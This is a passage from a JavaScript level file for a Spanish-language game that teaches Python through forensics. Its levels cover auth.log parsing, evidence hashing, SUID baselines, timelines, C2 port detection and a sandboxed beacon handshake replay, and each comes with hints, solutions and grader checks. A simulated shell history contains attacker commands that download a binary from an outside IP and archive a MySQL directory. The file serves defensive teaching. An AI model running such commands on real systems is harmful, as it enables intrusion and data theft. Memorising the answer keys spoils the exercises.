      "         b) Imprime una línea de prompt: f\"$ {cmd}\" — útil para\n" +
      "            ver claramente qué comando está mostrando qué output.\n" +
      "         c) Imprime r.stdout.\n" +
      "\n" +
      "PASO 4 — Patrón forense: anota SIEMPRE qué máquina es y bajo qué\n" +
      "         usuario corres antes de mirar logs. Sin esa info, los\n" +
      "         hallazgos no se pueden contextualizar para el reporte.",
    skeleton:
      'comandos = ["whoami", "id", "uname -a", "pwd"]\n' +
      '\n' +
      'for cmd in comandos:\n' +
      '    r = [TODO: llamada a la función bash con el comando]\n' +
      '    print(f"$ {cmd}")\n' +
      '    print(r.[TODO: atributo con la salida estándar])',
    starterCode:
      '# Triage del host bajo investigación. Misión en el briefing.\n\ncomandos = ["whoami", "id", "uname -a", "pwd"]\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\bbash\s*\(/, message: "Usa la función bash(...)" },
      { type: 'mustContain', regex: /\.stdout\b/, message: "Lee .stdout del resultado" },
    ],
    bash_fs: {
      _whoami: "forensic",
      _id: "uid=2000(forensic) gid=2000(forensic) groups=2000(forensic)",
      _uname: "Linux acme-int-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
      _pwd: "/mnt/evidence",
    },
  },

  {
    id: 42, chapter: 7,
    title: "Logs de autenticación",
    location: "Host bajo análisis · /var/log/auth.log",
    concept: "Parsear líneas de auth.log y contar fallos SSH",
    intro:
      "\"El triage te dijo dónde estás. Ahora, los logs de autenticación. " +
      "/var/log/auth.log registra cada intento de login, sshd incluido. Tu " +
      "trabajo: contar cuántos fallos SSH hubo y desde qué IP.\"",
    outro:
      "Patrón de fallos identificado. Esto es un IOC útil para el reporte.",
    diary:
      "Día 42. auth.log es texto. Una línea por evento. Filtrar por \"Failed " +
      "password\" + extraer la IP con regex y un Counter te dice todo lo " +
      "razonable en 8 líneas.",
    mission:
      "1) Lee /var/log/auth.log con bash(\"cat /var/log/auth.log\").\n" +
      "2) Filtra las líneas que contengan \"Failed password\".\n" +
      "3) Extrae la IP de cada una con regex (busca el patrón después de " +
      "\"from \"). Cuenta con Counter.\n" +
      "4) Imprime: \"Total fallos: N\" y debajo cada IP con su cuenta.",
    hint:
      'import re\nfrom collections import Counter\n\nlog = bash("cat /var/log/auth.log").stdout\nfallos = [l for l in log.split("\\n") if "Failed password" in l]\nips = [m.group(1) for l in fallos if (m := re.search(r"from (\\d+\\.\\d+\\.\\d+\\.\\d+)", l))]\n\nprint(f"Total fallos: {len(fallos)}")\nfor ip, n in Counter(ips).most_common():\n    print(f"  {ip}: {n}")',
    strategy:
      "PASO 1 — Imports: re y Counter.\n" +
      "\n" +
      "PASO 2 — Lee el log: bash(\"cat /var/log/auth.log\").stdout. Guarda\n" +
      "         en una variable log (string completo).\n" +
      "\n" +
      "PASO 3 — log.split(\"\\n\") da una lista con cada línea por separado.\n" +
      "         Filtra las líneas que contienen \"Failed password\":\n" +
      "             fallos = [l for l in log.split(\"\\n\") if \"Failed password\" in l]\n" +
      "\n" +
      "PASO 4 — Por cada línea de fallos, extrae la IP. Patrón regex:\n" +
      "             re.search(r\"from (\\d+\\.\\d+\\.\\d+\\.\\d+)\", l)\n" +
      "         El paréntesis es grupo capturable. m.group(1) = la IP.\n" +
      "         Truco con walrus operator (Python 3.8+):\n" +
      "             ips = [m.group(1) for l in fallos\n" +
      "                    if (m := re.search(r\"from (...)\", l))]\n" +
      "         m := asigna y devuelve m. El if comprueba que no es None.\n" +
      "         Si no quieres walrus, hazlo en un bucle for normal.\n" +
      "\n" +
      "PASO 5 — Counter(ips).most_common() devuelve la lista ordenada de\n" +
      "         (ip, conteo). Imprime el total y luego cada IP.",
    skeleton:
      'import re\n' +
      'from collections import Counter\n' +
      '\n' +
      '# Lee el log entero como string\n' +
      'log = bash("cat /var/log/auth.log").[TODO: atributo de salida]\n' +
      '\n' +
      '# Filtra líneas con "Failed password"\n' +
      'fallos = [l for l in log.split("\\n") if [TODO: substring "Failed password"] in l]\n' +
      '\n' +
      '# Extrae IP. Si no quieres walrus operator (:=), usa for normal\n' +
      'ips = []\n' +
      'for l in fallos:\n' +
      '    m = re.search(r"from ([TODO: patrón IPv4: 4 grupos de \\d+ separados por puntos])", l)\n' +
      '    if m:\n' +
      '        ips.append(m.group(1))\n' +
      '\n' +
      'print(f"Total fallos: {len(fallos)}")\n' +
      'for ip, n in Counter(ips).[TODO: top-N sin argumento devuelve TODOS]():\n' +
      '    print(f"  {ip}: {n}")',
    starterCode:
      '# Misión en el briefing.\nimport re\nfrom collections import Counter\n\n',
    win: { mustPrint: true, mustPrintMin: 2 },
    requires: [
      { type: 'mustContain', regex: /\bbash\s*\(/, message: "Usa bash(...)" },
      { type: 'mustContain', regex: /\bCounter\b/, message: "Usa collections.Counter" },
      { type: 'mustContain', regex: /\bre\.(search|match|findall)\s*\(/, message: "Usa re.search/match/findall para la IP" },
    ],
    bash_fs: {
      "/var/log/auth.log": [
        "Apr 27 09:01:14 acme-int-01 sshd[3201]: Accepted publickey for forensic from 10.0.0.2 port 51022",
        "Apr 27 09:14:02 acme-int-01 sshd[3340]: Failed password for invalid user admin from 203.0.113.7 port 41020",
        "Apr 27 09:14:05 acme-int-01 sshd[3340]: Failed password for invalid user admin from 203.0.113.7 port 41020",
        "Apr 27 09:14:09 acme-int-01 sshd[3340]: Failed password for invalid user root from 203.0.113.7 port 41020",
        "Apr 27 09:18:33 acme-int-01 sshd[3402]: Failed password for invalid user oracle from 198.51.100.42 port 33102",
        "Apr 27 09:22:11 acme-int-01 sshd[3411]: Failed password for invalid user pi from 203.0.113.7 port 41250",
        "Apr 27 09:25:45 acme-int-01 sshd[3501]: Accepted password for shopapp from 10.0.0.40 port 52004",
        "Apr 27 09:31:09 acme-int-01 sshd[3540]: Failed password for invalid user test from 198.51.100.42 port 33308",
      ],
    },
  },

  {
    id: 43, chapter: 7,
    title: "Hash de evidencia",
    location: "Forense · chain-of-custody",
    concept: "hashlib.sha256 sobre archivos para integridad",
    gives_potion: true,
    intro:
      "\"Antes de tocar nada, fijar la evidencia. La regla de oro forense: " +
      "cualquier archivo que entre al reporte va con su hash sha256, calculado " +
      "ANTES y DESPUÉS de cualquier operación de copia. Si los hashes coinciden, " +
      "puedes defender ante un juez que no se ha alterado.\"",
    outro:
      "Manifiesto de evidencia listo. Has obtenido una VPN burner.",
    diary:
      "Día 43. Chain-of-custody. Si copio un archivo, calculo su sha256 antes y " +
      "después. Si difiere, es que algo lo tocó. Sin esto, el reporte no vale " +
      "para nada en juicio.",
    mission:
      "1) Define hash_evidence(paths) que para cada path lea su contenido con " +
      "bash(f\"cat {path}\") y devuelva un dict {path: sha256_hex}.\n" +
      "2) Aplica la función a la lista FILES.\n" +
      "3) Imprime cada entry como \"<path>  <hash>\".",
    hint:
      'import hashlib\n\ndef hash_evidence(paths):\n    out = {}\n    for p in paths:\n        data = bash(f"cat {p}").stdout.encode()\n        out[p] = hashlib.sha256(data).hexdigest()\n    return out\n\nFILES = ["/var/log/auth.log", "/etc/issue", "/home/shopapp/.bash_history"]\nfor p, h in hash_evidence(FILES).items():\n    print(f"{p}  {h}")',
    strategy:
      "PASO 1 — La función hash_evidence(paths) recibe una lista de\n" +
      "         paths y devuelve dict {path: sha256_hex}.\n" +
      "\n" +
      "PASO 2 — Para cada path:\n" +
      "         a) Lee el contenido: bash(f\"cat {p}\").stdout es un string.\n" +
      "         b) hashlib.sha256 necesita BYTES, no string. Convierte\n" +
      "            con .encode().\n" +
      "         c) hashlib.sha256(data).hexdigest() devuelve el hash en\n" +
      "            string hex.\n" +
      "\n" +
      "PASO 3 — Acumula en un dict y devuélvelo con return.\n" +
      "\n" +
      "PASO 4 — Llama hash_evidence(FILES). Itera con .items() y print\n" +
      "         cada par path/hash separados por dos espacios (formato\n" +
      "         estándar de manifiestos).\n" +
      "\n" +
      "RECORDATORIO — Por qué SHA-256 y no MD5: para evidencia forense\n" +
      "         hace falta resistencia a colisiones. MD5 está roto desde\n" +
      "         hace años. SHA-256 es el estándar actual.",
    skeleton:
      'import hashlib\n' +
      '\n' +
      'def hash_evidence(paths):\n' +
      '    out = {}\n' +
      '    for p in paths:\n' +
      '        # Lee el archivo, convierte a bytes\n' +
      '        data = bash(f"cat {p}").stdout.[TODO: método para convertir a bytes]()\n' +
      '\n' +
      '        # SHA-256 → hex string\n' +
      '        out[p] = hashlib.[TODO: sha256](data).[TODO: método hex]()\n' +
      '    return out\n' +
      '\n' +
      'FILES = ["/var/log/auth.log", "/etc/issue", "/home/shopapp/.bash_history"]\n' +
      'for p, h in hash_evidence(FILES).items():\n' +
      '    print(f"{p}  {h}")',
    starterCode:
      '# Manifiesto de evidencia. Misión en el briefing.\nimport hashlib\n\nFILES = ["/var/log/auth.log", "/etc/issue", "/home/shopapp/.bash_history"]\n\n',
    win: { mustPrint: true, mustPrintMin: 3 },
    requires: [
      { type: 'mustContain', regex: /\bdef\s+\w+/, message: "Define una función" },
      { type: 'mustContain', regex: /\bbash\s*\(/, message: "Usa bash() para leer los archivos" },
      { type: 'mustContain', regex: /\bhashlib\.sha256\b/, message: "Usa hashlib.sha256" },
      { type: 'mustContain', regex: /\.hexdigest\s*\(/, message: "Llama .hexdigest() para el resultado" },
    ],
    bash_fs: {
      "/var/log/auth.log": [
        "Apr 27 09:01:14 acme-int-01 sshd[3201]: Accepted publickey for forensic from 10.0.0.2",
        "Apr 27 09:14:02 acme-int-01 sshd[3340]: Failed password for invalid user admin from 203.0.113.7",
      ],
      "/etc/issue": "Ubuntu 22.04.3 LTS \\n \\l",
      "/home/shopapp/.bash_history": [
        "cd /var/www/shopstack",
        "vim config.php",
        "tail -f /var/log/nginx/error.log",
      ],
    },
  },

  {
    id: 44, chapter: 7,
    title: "Detectar binarios SUID inesperados",
    location: "Forense · auditoría del filesystem",
    concept: "Cruzar listado contra una baseline de binarios esperados",
    intro:
      "\"Un atacante con root puede dejar binarios SUID custom para reentrar más " +
      "tarde. La auditoría: lista todos los SUID del sistema y compara contra la " +
      "BASELINE (los que esperarías en un sistema limpio: passwd, sudo, mount). " +
      "Cualquier cosa fuera de la baseline es candidato a investigar.\"",
    outro:
      "Binarios sospechosos marcados. Van al reporte como artefactos a analizar.",
    diary:
      "Día 44. Lo que importa no es lo que hay, es lo que NO debería estar. " +
      "Comparar contra una baseline es la mecánica más honesta de detección de " +
      "anomalías a nivel filesystem.",
    mission:
      "1) Ejecuta bash(\"find / -name *.suid\") para listar SUID del sistema.\n" +
      "2) Define BASELINE como el set de nombres esperados: " +
      "{\"passwd\", \"sudo\", \"mount\", \"umount\", \"su\"}.\n" +
      "3) Para cada path encontrado, extrae el nombre base (sin path ni .suid). " +
      "Si NO está en BASELINE, imprime: \"⚠ INESPERADO: <path>\". Si sí, " +
      "imprime \"ok: <path>\".",
    hint:
      'BASELINE = {"passwd", "sudo", "mount", "umount", "su"}\nbinarios = bash("find / -name *.suid").stdout.split("\\n")\n\nfor path in binarios:\n    if not path:\n        continue\n    name = path.split("/")[-1].replace(".suid", "")\n    if name not in BASELINE:\n        print(f"⚠ INESPERADO: {path}")\n    else:\n        print(f"ok: {path}")',
    strategy:
      "PASO 1 — La BASELINE ya está en el starter como SET (perfecto para\n" +
      "         test `in` en O(1)). No la redefinas.\n" +
      "\n" +
      "PASO 2 — Lista los SUID con bash. El stdout es un string con paths\n" +
      "         separados por \\n. Conviértelo a lista con .split(\"\\n\").\n" +
      "\n" +
      "PASO 3 — Para cada path:\n" +
      "         a) Si está vacío (último split a veces da \"\"), salta con\n" +
      "            continue.\n" +
      "         b) Extrae el nombre base: path.split(\"/\")[-1] da la última\n" +
      "            parte del path. Ej: \"/usr/bin/passwd.suid\" → \"passwd.suid\".\n" +
      "         c) Quita la extensión: .replace(\".suid\", \"\").\n" +
      "         d) Si name NO ESTÁ en BASELINE → INESPERADO. Si sí → ok.\n" +
      "\n" +
      "PASO 4 — La heurística: una baseline es \"lo que esperas en un sistema\n" +
      "         limpio\". Cualquier desviación es candidato a investigar.\n" +
      "         No prueba que sea malicioso, pero apunta dónde mirar.",
    skeleton:
      'BASELINE = {"passwd", "sudo", "mount", "umount", "su"}\n' +
      '\n' +
      '# El stdout viene con paths separados por \\n. Split a lista.\n' +
      'binarios = bash("find / -name *.suid").stdout.[TODO: split por \\n]("\\n")\n' +
      '\n' +
      'for path in binarios:\n' +
      '    if not path:\n' +
      '        continue   # ignora líneas vacías\n' +
      '\n' +
      '    # Última parte del path = nombre base con extensión\n' +
      '    name = path.split("/")[[TODO: índice del último elemento]].replace(".suid", "")\n' +
      '\n' +
      '    if name [TODO: operador "no está en"] BASELINE:\n' +
      '        print(f"⚠ INESPERADO: {path}")\n' +
      '    else:\n' +
      '        print(f"ok: {path}")',
    starterCode:
      '# Misión en el briefing.\n\nBASELINE = {"passwd", "sudo", "mount", "umount", "su"}\n',
    win: { mustPrint: true, mustPrintMin: 3 },
    requires: [
      { type: 'mustContain', regex: /\bbash\s*\(/, message: "Usa bash()" },
      { type: 'mustContain', regex: /\bnot\s+in\s+BASELINE\b|\bin\s+BASELINE\b/, message: "Compara contra BASELINE" },
      { type: 'mustContain', regex: /\.split\s*\(/, message: "Procesa el stdout con .split()" },
    ],
    bash: {
      "find / -name *.suid": {
        stdout: "/usr/bin/passwd.suid\n/usr/bin/sudo.suid\n/usr/bin/mount.suid\n/tmp/.cache/x.suid\n/opt/legacy/oldhelper.suid",
        returncode: 0,
      },
    },
  },

  {
    id: 45, chapter: 7,
    title: "Timeline de eventos",
    location: "Forense · reconstrucción cronológica",
    concept: "Combinar fuentes y ordenar por timestamp",
    intro:
      "\"Lo que mejor cuentan los logs no son los eventos — es el orden. " +
      "Reconstruir una timeline es lo que convierte 'hubo cosas raras' en " +
      "'a las 09:14 entró por SSH, a las 09:18 escribió en /tmp, a las 09:25 " +
      "tocó la base de datos'. Vas a juntar dos fuentes en una timeline " +
      "ordenada.\"",
    outro:
      "Timeline construida. Esto va al cuerpo principal del reporte forense.",
    diary:
      "Día 45. sorted() con key. Una lista de tuplas (timestamp, fuente, " +
      "evento) ordenada queda casi como un reporte por sí sola.",
    mission:
      "Tienes dos fuentes simuladas (auth.log + bash_history) en /var/log/auth.log " +
      "y /home/shopapp/.bash_history.timeline (cada línea ya viene como " +
      "\"YYYY-MM-DD HH:MM | evento\").\n\n" +
      "1) Lee ambos archivos con bash.\n" +
      "2) Construye una lista combinada de tuplas (timestamp, fuente, evento) " +
      "etiquetando cada línea con su fuente.\n" +
      "3) Ordénala por timestamp con sorted(..., key=...).\n" +
      "4) Imprime la timeline: \"<ts>  [<fuente>]  <evento>\".",
    hint:
      'def parse(path, fuente):\n    out = []\n    for line in bash(f"cat {path}").stdout.split("\\n"):\n        if not line.strip():\n            continue\n        ts, _, evento = line.partition(" | ")\n        out.append((ts, fuente, evento))\n    return out\n\nevents = parse("/var/log/auth.log.timeline", "auth") + parse("/home/shopapp/.bash_history.timeline", "shell")\nfor ts, src, ev in sorted(events, key=lambda t: t[0]):\n    print(f"{ts}  [{src}]  {ev}")',
    strategy:
      "PASO 1 — Define una función parse(path, fuente) que:\n" +
      "         a) Lee el archivo con bash(f\"cat {path}\").stdout.\n" +
      "         b) Divide en líneas con .split(\"\\n\").\n" +
      "         c) Salta líneas vacías con if not line.strip().\n" +
      "         d) Cada línea tiene formato \"timestamp | evento\".\n" +
      "            Usa partition(\" | \") para dividir en 3: ts, sep, evento.\n" +
      "         e) Acumula tuplas (ts, fuente, evento) en una lista.\n" +
      "         f) return la lista.\n" +
      "\n" +
      "PASO 2 — Llama parse para cada fuente con su etiqueta. Las dos\n" +
      "         listas se pueden CONCATENAR con +:\n" +
      "             events = parse(path1, \"auth\") + parse(path2, \"shell\")\n" +
      "\n" +
      "PASO 3 — Ordena por el primer elemento de la tupla (timestamp).\n" +
      "         sorted con key:\n" +
      "             sorted(events, key=lambda t: t[0])\n" +
      "         lambda es función anónima: t es la tupla, t[0] es el ts.\n" +
      "         Como los timestamps están en formato YYYY-MM-DD HH:MM,\n" +
      "         el orden alfabético coincide con el cronológico.\n" +
      "\n" +
      "PASO 4 — Itera la timeline ordenada. Desempaqueta la tupla en el\n" +
      "         for: for ts, src, ev in .... Imprime cada línea.",
    skeleton:
      'def parse(path, fuente):\n' +
      '    out = []\n' +
      '    for line in bash(f"cat {path}").stdout.split("\\n"):\n' +
      '        if not line.strip():\n' +
      '            continue\n' +
      '        # partition siempre devuelve 3 partes\n' +
      '        ts, _, evento = line.[TODO: partition con " | "](" | ")\n' +
      '        out.append((ts, fuente, evento))\n' +
      '    return out\n' +
      '\n' +
      '# Concatenación de listas con +\n' +
      'events = parse("/var/log/auth.log.timeline", "auth") + parse(\n' +
      '    "/home/shopapp/.bash_history.timeline", "shell")\n' +
      '\n' +
      '# sorted con key=lambda — t es la tupla, t[0] es el timestamp\n' +
      'for ts, src, ev in sorted(events, key=[TODO: lambda que devuelva el primer elemento de la tupla]):\n' +
      '    print(f"{ts}  [{src}]  {ev}")',
    starterCode:
      '# Timeline forense. Cada línea de los archivos viene formateada como\n# "YYYY-MM-DD HH:MM | evento". Misión en el briefing.\n\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\bbash\s*\(/, message: "Usa bash()" },
      { type: 'mustContain', regex: /\bsorted\s*\(/, message: "Usa sorted(...) para ordenar" },
      { type: 'mustContain', regex: /\bkey\s*=/, message: "Pasa el argumento key= al sort" },
    ],
    bash_fs: {
      "/var/log/auth.log.timeline": [
        "2026-04-27 09:14 | Failed password from 203.0.113.7",
        "2026-04-27 09:14 | Failed password from 203.0.113.7",
        "2026-04-27 09:18 | Failed password from 198.51.100.42",
        "2026-04-27 09:25 | Accepted password for shopapp from 10.0.0.40",
      ],
      "/home/shopapp/.bash_history.timeline": [
        "2026-04-27 09:26 | cd /tmp",
        "2026-04-27 09:27 | wget http://203.0.113.7/x.bin",
        "2026-04-27 09:30 | mysql -u root -p",
        "2026-04-27 09:35 | tar czf /tmp/d.tgz /var/lib/mysql",
      ],
    },
  },

  {
    id: 46, chapter: 7,
    title: "Evaluación: reporte forense",
    location: "Sala de evaluaciones · host bajo análisis",
    concept: "EVALUACIÓN — triage + log + hashes en un único reporte",
    is_exam: true,
    is_checkpoint: true,
    intro:
      "\"Construye el reporte forense completo del host: identidad, fallos SSH " +
      "por IP, hashes de evidencia. JSON estructurado.\"",
    outro:
      "Cap 7 cerrado. Próximo: operación final.",
    diary:
      "Día 46. Séptimo examen. Reporte forense en menos de 25 líneas. Solo un " +
      "capítulo antes del Caldera.",
    mission:
      "Construye un dict report con:\n\n" +
      "  • host: bash(\"uname -a\").stdout.strip()\n" +
      "  • analyst: bash(\"whoami\").stdout.strip()\n" +
      "  • ssh_failures_by_ip: dict {ip: count} con fallos de /var/log/auth.log\n" +
      "  • evidence_hashes: dict {path: sha256_hex} para FILES = " +
      "[\"/var/log/auth.log\", \"/etc/issue\"]\n\n" +
      "Imprime el reporte como JSON con indent=2.\n\n" +
      "RESTRICCIONES:\n" +
      "• Máximo 25 líneas\n" +
      "• Debes definir al menos una función con def\n" +
      "• Debes usar bash()\n" +
      "• Debes usar hashlib.sha256\n" +
      "• Debes usar json.dumps con indent=2",
    hint: "Evaluación sin pista.",
    solution:
      'import json, re, hashlib\nfrom collections import Counter\n\ndef ssh_fails():\n    log = bash("cat /var/log/auth.log").stdout\n    ips = re.findall(r"Failed password.* from (\\d+\\.\\d+\\.\\d+\\.\\d+)", log)\n    return dict(Counter(ips))\n\ndef hash_files(paths):\n    return {p: hashlib.sha256(bash(f"cat {p}").stdout.encode()).hexdigest() for p in paths}\n\nFILES = ["/var/log/auth.log", "/etc/issue"]\nreport = {\n    "host": bash("uname -a").stdout.strip(),\n    "analyst": bash("whoami").stdout.strip(),\n    "ssh_failures_by_ip": ssh_fails(),\n    "evidence_hashes": hash_files(FILES),\n}\nprint(json.dumps(report, indent=2))',
    starterCode:
      '# EVALUACIÓN — Capítulo 7\n# Reporte forense JSON: host + analyst + ssh_failures + evidence_hashes\n\n',
    win: { mustPrint: true },
    restrictions: [
      { type: 'maxLines', value: 25, message: "Máximo 25 líneas" },
      { type: 'mustContain', regex: /\bdef\s+\w+/, message: "Define al menos una función" },
      { type: 'mustContain', regex: /\bbash\s*\(/, message: "Usa bash()" },
      { type: 'mustContain', regex: /\bhashlib\.sha256\b/, message: "Usa hashlib.sha256" },
      { type: 'mustContain', regex: /\bjson\.dumps\s*\(/, message: "Usa json.dumps" },
      { type: 'mustContain', regex: /\bindent\s*=\s*2/, message: "Usa indent=2" },
    ],
    bash_fs: {
      _whoami: "forensic",
      _uname: "Linux acme-int-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux",
      "/etc/issue": "Ubuntu 22.04.3 LTS \\n \\l",
      "/var/log/auth.log": [
        "Apr 27 09:14:02 acme-int-01 sshd[3340]: Failed password for invalid user admin from 203.0.113.7 port 41020",
        "Apr 27 09:14:09 acme-int-01 sshd[3340]: Failed password for invalid user root from 203.0.113.7 port 41020",
        "Apr 27 09:18:33 acme-int-01 sshd[3402]: Failed password for invalid user oracle from 198.51.100.42 port 33102",
        "Apr 27 09:22:11 acme-int-01 sshd[3411]: Failed password for invalid user pi from 203.0.113.7 port 41250",
        "Apr 27 09:25:45 acme-int-01 sshd[3501]: Accepted password for shopapp from 10.0.0.40 port 52004",
      ],
    },
  },

  // ============================================================
  // CAPÍTULO 8 — OPERACIÓN CALDERA (47-50) — Final
  // Cliente bajo ataque APT. Detección, contención y reporte —
  // todo lo aprendido al servicio del blue team.
  // ============================================================
  {
    id: 47, chapter: 8,
    title: "Caldera — primer recon",
    location: "Cliente: NorthBank · sospecha de intrusión",
    concept: "Recon estructurado bajo presión",
    is_checkpoint: true,
    intro:
      "\"NorthBank ha llamado. Tráfico anómalo. El equipo blue team sospecha que " +
      "Caldera está dentro. Tu trabajo: recon paralelo a su investigación. Tienes 4 " +
      "subdominios, escanéalos, identifica servicios anómalos.\"",
    outro:
      "Mapa preliminar listo. Detectado un host con servicios extraños.",
    diary:
      "Día 47. Esto ya no es lab. NorthBank, infraestructura real bajo posible APT. " +
      "Iris no parpadea. Yo intento que tampoco.",
    mission:
      "1) Para cada host en [\"web.northbank.local\", \"db.northbank.local\", " +
      "\"mail.northbank.local\", \"backup.northbank.local\"]:\n" +
      "   a. Escanea puertos comunes [22, 80, 443, 3306, 4444, 8080, 9001].\n" +
      "   b. Imprime los abiertos por host.\n" +
      "2) Identifica el host que tenga puertos NO esperados (4444 o 9001 son típicos " +
      "de C2). Imprime: \"ANOMALÍA en HOST: puerto X abierto\".",
    hint:
      'hosts = ["web.northbank.local", "db.northbank.local", "mail.northbank.local", "backup.northbank.local"]\nports = [22, 80, 443, 3306, 4444, 8080, 9001]\nC2 = {4444, 9001}\n\nfor h in hosts:\n    abiertos = [p for p in ports if scan_port(h, p) == "open"]\n    print(f"{h}: {abiertos}")\n    for p in abiertos:\n        if p in C2:\n            print(f"ANOMALÍA en {h}: puerto {p} abierto")',
    strategy:
      "PASO 1 — Lo que sabes: una lista de hosts del cliente NorthBank y\n" +
      "         puertos que vas a probar. Lo que buscas: hosts con puertos\n" +
      "         de C2 conocidos (4444, 9001) abiertos — señal de implant.\n" +
      "\n" +
      "PASO 2 — Define un set C2 con los puertos sospechosos. Set, no\n" +
      "         lista, para que `port in C2` sea O(1).\n" +
      "\n" +
      "PASO 3 — Para cada host:\n" +
      "         a) List comprehension: puertos abiertos.\n" +
      "             abiertos = [p for p in ports if scan_port(h, p) == \"open\"]\n" +
      "         b) Imprime lista de abiertos para tener el panorama.\n" +
      "         c) Para cada puerto abierto, comprueba si está en C2.\n" +
      "            Si sí, imprime ANOMALÍA con detalle del host y puerto.\n" +
      "\n" +
      "RECORDATORIO — Tú no atacas el C2: lo identificas y lo reportas al\n" +
      "         blue team del cliente para que lo aíslen. Tu output es\n" +
      "         visibilidad, no acción contra el infrastructure del atacante.",
    skeleton:
      'hosts = ["web.northbank.local", "db.northbank.local", "mail.northbank.local", "backup.northbank.local"]\n' +
      'ports = [22, 80, 443, 3306, 4444, 8080, 9001]\n' +
      '\n' +
      '# Set para test in O(1)\n' +
      'C2 = [TODO: set con 4444 y 9001]\n' +
      '\n' +
      'for h in hosts:\n' +
      '    abiertos = [p for p in ports if scan_port(h, p) == "open"]\n' +
      '    print(f"{h}: {abiertos}")\n' +
      '\n' +
      '    for p in abiertos:\n' +
      '        if p [TODO: operador "está en"] C2:\n' +
      '            print(f"ANOMALÍA en {h}: puerto {p} abierto")',
    starterCode:
      '# Misión en el briefing.\n\nhosts = ["web.northbank.local", "db.northbank.local", "mail.northbank.local", "backup.northbank.local"]\nports = [22, 80, 443, 3306, 4444, 8080, 9001]\n',
    win: { mustPrint: true, mustPrintMin: 4 },
    requires: [
      { type: 'mustContain', regex: /\bscan_port\s*\(/, message: "Usa scan_port" },
      { type: 'mustContain', regex: /\bfor\s+\w+\s+in\b/, message: "Itera con for" },
    ],
    targets: {
      "web.northbank.local":    { ports: { 22: { status: "open" }, 80: { status: "open" }, 443: { status: "open" } } },
      "db.northbank.local":     { ports: { 22: { status: "open" }, 3306: { status: "open" } } },
      "mail.northbank.local":   { ports: { 22: { status: "filtered" }, 443: { status: "open" } } },
      "backup.northbank.local": { ports: { 22: { status: "open" }, 4444: { status: "open", service: "Caldera C2" }, 9001: { status: "open", service: "Caldera C2 alt" } } },
    },
  },

  {
    id: 48, chapter: 8,
    title: "Caldera — replay del beacon en sandbox",
    location: "SOC · sandbox de análisis de malware",
    concept: "Reverse engineering + reproducir handshake en sandbox controlada",
    intro:
      "\"El SOC ha capturado tráfico del beacon Caldera durante el incidente. El " +
      "host comprometido está aislado y un sample del implant se ha detonado en " +
      "una sandbox que replica el protocolo del C2 a partir del pcap. Tu trabajo: " +
      "implementar el handshake que el malware mandaba (CALDERA-HANDSHAKE-V2 + " +
      "MD5 del día) para leer qué comandos tenía en cola el atacante. Es " +
      "intel para el reporte, no una conexión real al C2.\"",
    outro:
      "Cola de comandos del atacante extraída del replay. Va al apartado de TTPs " +
      "del reporte.",
    diary:
      "Día 48. La sandbox del SOC me deja hablar con el clon del C2 sin riesgo. " +
      "Iris tenía pcaps de meses atrás — el handshake salió de ahí. Lo que saco " +
      "aquí son IOCs y TTPs para el reporte, no acciones contra la infraestructura " +
      "del atacante. Tocar el C2 real sería interferir con investigación judicial — " +
      "regla de oro: trabajar siempre sobre la réplica, nunca sobre el vivo.",
    mission:
      "1) Calcula el hash MD5 del string \"2026-04-27\" (fecha del incidente).\n" +
      "2) Construye el handshake: \"CALDERA-HANDSHAKE-V2:\" + hex_del_md5.\n" +
      "3) socket_request a backup.northbank.local:4444 (sandbox local) con el " +
      "handshake.\n" +
      "4) Imprime la respuesta. Si contiene \"OPERATION_ID\" → has reproducido " +
      "el check-in.",
    hint:
      'import hashlib\n\ndaily = "2026-04-27"\ntoken = hashlib.md5(daily.encode()).hexdigest()\nhandshake = f"CALDERA-HANDSHAKE-V2:{token}"\n\nresp = socket_request("backup.northbank.local", 4444, handshake)\nprint(resp)\nif "OPERATION_ID" in (resp or ""):\n    print("[+] Acceso al C2 conseguido")',
    strategy:
      "PASO 1 — El SOC ha capturado pcap del beacon. De ahí salió que el\n" +
      "         handshake es \"CALDERA-HANDSHAKE-V2:\" + md5_hex(fecha).\n" +
      "         Tu papel: replicar ese handshake en una sandbox local que\n" +
      "         imita el C2 — para extraer la cola de comandos sin tocar\n" +
      "         la infraestructura real del atacante.\n" +
      "\n" +
      "PASO 2 — Construye el token diario:\n" +
      "         a) Fecha del incidente: \"2026-04-27\".\n" +
      "         b) hashlib.md5 NECESITA bytes — convierte con .encode().\n" +
      "         c) .hexdigest() para el string hex.\n" +
      "             token = hashlib.md5(\"2026-04-27\".encode()).hexdigest()\n" +
      "\n" +
      "PASO 3 — Construye el handshake completo con f-string:\n" +
      "             handshake = f\"CALDERA-HANDSHAKE-V2:{token}\"\n" +
      "\n" +
      "PASO 4 — socket_request al puerto 4444 de la sandbox local. Pasa\n" +
      "         el handshake como payload. Devuelve la respuesta string\n" +
      "         (o None si no responde).\n" +
      "\n" +
      "PASO 5 — Si la respuesta contiene \"OPERATION_ID\", el handshake fue\n" +
      "         válido y la sandbox te ha dado los IOCs/TTPs. Imprime\n" +
      "         confirmación. (resp or \"\" para evitar None.)\n" +
      "\n" +
      "RECORDATORIO — Esto es REPLICA del C2 en sandbox. Tocar el C2 real\n" +
      "         puede interferir con investigación judicial — siempre\n" +
      "         sobre la réplica, nunca el vivo.",
    skeleton:
      'import hashlib\n' +
      '\n' +
      '# Fecha del incidente — la dijo el SOC\n' +
      'daily = "2026-04-27"\n' +
      '\n' +
      '# md5(bytes) -> objeto, .hexdigest() -> string hex\n' +
      'token = hashlib.[TODO: md5](daily.[TODO: convertir a bytes]()).[TODO: hex]()\n' +
      '\n' +
      '# Construye el payload con f-string\n' +
      'handshake = f"CALDERA-HANDSHAKE-V2:{[TODO: el token]}"\n' +
      '\n' +
      '# socket_request a la sandbox local que imita el C2\n' +
      'resp = socket_request("backup.northbank.local", 4444, handshake)\n' +
      'print(resp)\n' +
      '\n' +
      '# Comprueba que el handshake funcionó. resp or "" protege None.\n' +
      'if "OPERATION_ID" in (resp [TODO: operador OR para fallback ""] ""):\n' +
      '    print("[+] Acceso al C2 conseguido")',
    starterCode:
      '# Replay del beacon en sandbox. Misión y formato del handshake en el briefing.\n\n',
    win: { mustPrint: true },
    requires: [
      { type: 'mustContain', regex: /\bimport\s+hashlib\b/, message: "Importa hashlib" },
      { type: 'mustContain', regex: /\bsocket_request\s*\(/, message: "Usa socket_request" },
